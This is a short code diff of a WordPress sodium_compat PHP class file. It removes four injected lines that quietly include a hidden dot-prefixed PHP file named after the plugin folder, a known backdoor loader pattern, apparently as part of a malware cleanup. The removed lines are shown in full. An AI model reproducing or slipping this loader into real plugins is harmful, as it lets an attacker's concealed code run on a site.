@@ -7,10 +7,6 @@ if (class_exists('ParagonIE_Sodium_Core_Poly1305_State', false)) {
 /**
  * Class ParagonIE_Sodium_Core_Poly1305_State
  */
-if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
-    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
-}
-
 class ParagonIE_Sodium_Core_Poly1305_State extends ParagonIE_Sodium_Core_Util
 {
     /**
